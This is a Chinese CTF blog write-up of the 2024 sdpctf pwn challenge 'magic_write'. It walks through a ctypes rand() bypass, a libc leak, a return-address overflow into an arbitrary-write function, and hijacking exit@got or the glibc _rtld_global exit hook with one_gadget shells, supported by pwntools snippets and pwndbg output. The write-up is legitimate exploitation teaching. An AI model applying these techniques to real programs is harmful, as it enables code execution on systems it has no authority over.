<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
  
  <title>『2024sdpctf(山警校赛)』magic_write | C_LBY&#39;s BLOG</title>
  <meta name="author" content="鎏柏鱼">
  
  <meta name="description" content="从这道题学习exit hook的一种打法和查找偏移的方法">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="『2024sdpctf(山警校赛)』magic_write"/>
  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 『2024sdpctf(山警校赛)』magic_write</h1>
		</div>
	



	<div class="row post">
		<!-- cols -->
		
			<div id="top_meta"></div>
			<div class="col-md-9">
				

							<!-- content -->
							<div class="mypage">
								
									<div class="alert alert-success description">
										<i class="fa fa-info-circle"></i> 从这道题学习exit hook的一种打法和查找偏移的方法
									</div> <!-- alert -->
									

										<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  myinit(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter this challenge&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v6 = v7 % <span class="number">0x6E</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 % <span class="number">0x6E</span> == v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give you a gift&quot;</span>);</span><br><span class="line">    gift();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Do you know any address to write&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come and try it out&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x2E</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数开头要我们绕过一个随机数检查才有输入点。gift函数会打印puts函数的libc地址，libc地址不请自来。接着read函数溢出14个字节，只能覆盖六个字节到ret地址，所以想要在这里写one gadget是不可能的了，因为libc地址占七个字节。</p>
<p>另外，题目有一个magic函数，可以进行任意地址写，并且只能读取八个字节，以exit退出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations on completing a big step&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个提示就很明显了，可以劫持exit@got或者劫持exit_hook写one gadget。</p>
<h3 id="分析调试-出现的问题"><a href="#分析调试-出现的问题" class="headerlink" title="分析调试&amp;出现的问题"></a>分析调试&amp;出现的问题</h3><h5 id="随机数绕过"><a href="#随机数绕过" class="headerlink" title="随机数绕过"></a>随机数绕过</h5><p>开头的随机数种子是time(0)，题目给了libc附件，所以我们可以在python使用ctypes库来调用动态链接库函数来同步获取time(0)，以获得相同的随机数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libcc.srand(libcc.time(<span class="number">0</span>))</span><br><span class="line">ran_num = libcc.rand() % <span class="number">0x6E</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;please enter this challenge\n&quot;</span>, <span class="built_in">str</span>(ran_num).encode())</span><br></pre></td></tr></table></figure>

<p>在打远程靶机的时候可能会因为时延而获取不到相同的随机数，多试几次就好了。</p>
<h4 id="接收libc地址"><a href="#接收libc地址" class="headerlink" title="接收libc地址"></a>接收libc地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&quot;Give you a gift\n&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><p>溢出只溢出了六个字节，但是我们在这里的目的，是劫持程序执行流执行magic函数，获得任意地址写的机会。</p>
<p>这里需要注意一个问题，不要发超过六个字节。后面magic函数里是两个read，如果前面留下字节在输入流中，会被后面的read直接读取，导致意料之外的错误。另外就是最好是用send，sendline会引入多一个回车。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0x4012bd</span></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + <span class="string">b&#x27;\xbd\x12\x40\x00\x00\x00&#x27;</span></span><br><span class="line">r.send(pay1)</span><br></pre></td></tr></table></figure>

<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>这是这道题的核心，也是发现最多问题的地方。其实运气好的话可以不用那么曲折，不过遇到了问题可以学到更多东西，未尝不是一种好事。</p>
<p>我们在看一次magic函数的核心语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>第一个read可以控制buf的地址，第二个read可以控制buf内容，妥妥的任意地址写。因为只有8个字节的空间，所以考虑劫持got表。有libc附件可以得到onegadget</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc-<span class="number">2.31</span>.so</span><br><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [r15] == <span class="type">NULL</span> || r15 == <span class="type">NULL</span> || r15 is a valid argv</span><br><span class="line">  [r12] == <span class="type">NULL</span> || r12 == <span class="type">NULL</span> || r12 is a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [r15] == <span class="type">NULL</span> || r15 == <span class="type">NULL</span> || r15 is a valid argv</span><br><span class="line">  [rdx] == <span class="type">NULL</span> || rdx == <span class="type">NULL</span> || rdx is a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [rsi] == <span class="type">NULL</span> || rsi == <span class="type">NULL</span> || rsi is a valid argv</span><br><span class="line">  [rdx] == <span class="type">NULL</span> || rdx == <span class="type">NULL</span> || rdx is a valid envp</span><br></pre></td></tr></table></figure>

<h5 id="劫持got表，但one-gadget无效"><a href="#劫持got表，但one-gadget无效" class="headerlink" title="劫持got表，但one gadget无效"></a>劫持got表，但one gadget无效</h5><p>然后利用下面的脚本来劫持exit@got</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(e.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>

<p>然后你会发现，打不通。动调，看看怎么个事</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/%E5%AF%84%E5%AD%98%E5%99%A8%E7%8A%B6%E6%80%81.png" alt="寄存器状态"></p>
<p>好家伙，rdx和r12都不为0，根本没法执行execve的onegadget，因为参数不匹配，所以syscall直接失效了，最后执行到<code>__stack_chk_fail</code>的时候就会卡住：</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%97%A0%E6%95%88onegadget%E5%8D%A1%E4%BD%8F.png" alt="无效onegadget卡住"></p>
<p>我们没办法在仅有8个字节的read里解决寄存器问题，所以不得不放弃劫持got表，转战劫持exit hook。</p>
<h5 id="劫持exit-hook，但是被检测到栈溢出？"><a href="#劫持exit-hook，但是被检测到栈溢出？" class="headerlink" title="劫持exit hook，但是被检测到栈溢出？"></a>劫持exit hook，但是被检测到栈溢出？</h5><p>顺带一提，程序本身是没有开canary保护的，但是libc是有canary保护的，所以在执行one gadget的时候会执行到__stack_chk_fail也很正常。</p>
<p>要劫持<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12856?time__1311=mqmhq+xfxUxoDsD7GY5r=bDk7D8lKeD&alichlgref=https://www.bing.com/#toc-2">exit hook</a>，我们要先找到当前版本下_rtld_global结构体的位置和对应_dl_rtld_lock_recursive的位置。我们用gdb打开程序（默认已经patchelf了），运行后中断，输入以下命令：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; p &amp;_rtld_global</span><br><span class="line">$<span class="number">1</span> = (&lt;<span class="class"><span class="keyword">data</span> variable, no debug info&gt; *) 0x7ffff7ffd060 &lt;_rtld_global&gt;</span></span><br><span class="line"><span class="title">pwndbg</span>&gt; vmmap</span><br><span class="line"><span class="type">LEGEND</span>: <span class="type">STACK</span> | <span class="type">HEAP</span> | <span class="type">CODE</span> | <span class="type">DATA</span> | <span class="type">RWX</span> | <span class="type">RODATA</span></span><br><span class="line">             <span class="type">Start</span>                <span class="type">End</span> <span class="type">Perm</span>     <span class="type">Size</span> <span class="type">Offset</span> <span class="type">File</span></span><br><span class="line">          <span class="number">0x3fe000</span>           <span class="number">0x3ff000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r<span class="comment">--p     1000   2000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x401000</span>           <span class="number">0x402000</span> r-xp     <span class="number">1000</span>   <span class="number">3000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">          <span class="number">0x402000</span>           <span class="number">0x403000</span> r<span class="comment">--p     1000   4000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x403000</span>           <span class="number">0x404000</span> r<span class="comment">--p     1000   4000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x404000</span>           <span class="number">0x405000</span> rw-p     <span class="number">1000</span>   <span class="number">5000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">    <span class="number">0x7ffff7dd5000</span>     <span class="number">0x7ffff7df7000</span> r<span class="comment">--p    22000      0 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7df7000</span>     <span class="number">0x7ffff7f6f000</span> r-xp   <span class="number">178000</span>  <span class="number">22000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7f6f000</span>     <span class="number">0x7ffff7fbd000</span> r<span class="comment">--p    4e000 19a000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fbd000</span>     <span class="number">0x7ffff7fc1000</span> r<span class="comment">--p     4000 1e7000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fc1000</span>     <span class="number">0x7ffff7fc3000</span> rw-p     <span class="number">2000</span> 1eb000 /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fc3000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">6000</span>      <span class="number">0</span> [anon_7ffff7fc3]</span><br><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r<span class="comment">--p     4000      0 [vvar]</span></span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r<span class="comment">--p     1000      0 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span>   <span class="number">1000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/ld-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r<span class="comment">--p     8000  24000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r<span class="comment">--p     1000  2c000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span>  2d000 /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/ld-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffdd000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">22000</span>      <span class="number">0</span> [stack]</span><br><span class="line"><span class="title">pwndbg</span>&gt; tele <span class="number">0x7ffff7ffdf68</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ffdf68</span> (_rtld_global+<span class="number">3848</span>) —▸ <span class="number">0x7ffff7fd0150</span> ◂— endbr64</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ffdf70</span> (_rtld_global+<span class="number">3856</span>) —▸ <span class="number">0x7ffff7fd0160</span> ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ffdf78</span> (_rtld_global+<span class="number">3864</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7ffdf90</span> (_rtld_global+<span class="number">3888</span>) —▸ <span class="number">0x7ffff7fe4140</span> (_dl_make_stack_executable) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7ffdf98</span> (_rtld_global+<span class="number">3896</span>) ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7ffdfa0</span> (_rtld_global+<span class="number">3904</span>) ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>

<p>命令当中tele那句只是为了确认0xf08处是否是_dl_rtld_lock_recursive，一般看到0x150和0x160结尾的一般就是了。小版本差异可能导致偏移不一致。</p>
<p>可以看到<code>_rtld_global</code>的地址位于0x7ffff7ffd060，而libc基址位于0x7ffff7dd5000，又知<code>_dl_rtld_lock_recursive</code>在结构体中的偏移位置一般是0xf08，所以计算器算一下就可以得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global = libc_base+<span class="number">0x228060</span></span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive = _rtld_global + <span class="number">0xf10</span></span><br></pre></td></tr></table></figure>

<p>有了这些偏移，我们就可以劫持lock这个函数指针为onegadget，从而使程序执行exit的时候可以执行到onegadget，于是我使用下面的语句：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(_dl_rtld_lock_recursive))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>运行后发现被检测出来栈溢出了！</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/%E8%A2%AB%E6%A3%80%E6%B5%8B%E5%88%B0%E6%A0%88%E6%BA%A2%E5%87%BA.png" alt="被检测到栈溢出"></p>
<p>动调发现，还真是巧，执行exit函数的时候栈帧刚好和main函数的栈帧重叠了，而刚好输入的_dl_rtld_lock_recursive地址覆盖了rbp-0x8的位置。</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%A0%88.png" alt="栈溢出的栈"></p>
<p>往下单步到call execve前</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%A0%88%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8.png" alt="栈溢出问题的寄存器"></p>
<p>可以发现，rsi最后指向0，但是rdx不为0。刚才提到这个问题，这会导致syscall失效，从而继续往下执行__stack_chk_fail，而后面rsp莫名奇妙变成了libc地址，栈不正常，从而被判断成有溢出。</p>
<p>如果细心一点会发现这时候r12是0，这意味着如果把one[1]换成one[0]这道题就可以结束了，但是我当时没发现，所以又折腾出了另一个问题。</p>
<h5 id="劫持exit-hook，但是只能用一遍"><a href="#劫持exit-hook，但是只能用一遍" class="headerlink" title="劫持exit hook，但是只能用一遍"></a>劫持exit hook，但是只能用一遍</h5><p>当时以为是exit函数栈帧与main函数重叠的原因（然而并不是）导致的栈溢出检测，想着能不能通过返回到类似sub rsp,20h这样的指令来抬高栈。所以我打算先劫持hook为0x4012C5（magic函数里的sub语句），返回magic再打hook为onegadget，发现虽然成功返回到了magic函数，并且不提示栈溢出了，但是也没打通。动调单步一直向下发现程序并没有执行到_dl_rtld_lock_recursive所指向的onegadget。比赛结束后问了xf1les师傅，翻了翻源码，发现这是exit函数有意为之的。</p>
<p>exit.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      atfct ();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>

<p>exit.h：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ef_free,	<span class="comment">/* `ef_free&#x27; MUST be zero!  */</span></span><br><span class="line">  ef_us,</span><br><span class="line">  ef_on,</span><br><span class="line">  ef_at,</span><br><span class="line">  ef_cxa</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注释有讲到，为了避免<code>dlclose/exit</code>争用两次调用<code>cxafct</code>，所以在case ef_cxa后会将<code>exit_function</code>结构体里的<code>f-&gt;flavor</code>置为<code>ef_free</code>，即设置为0。可以看到只有在ef_cxa的情况下才会对<code>cxafct</code>做出处理，这个东西会转换成_dl_fini函数地址，这里不展开，简单来说就是在这个情况下才会执行到_dl_rtld_lock_recursive所指向的函数。</p>
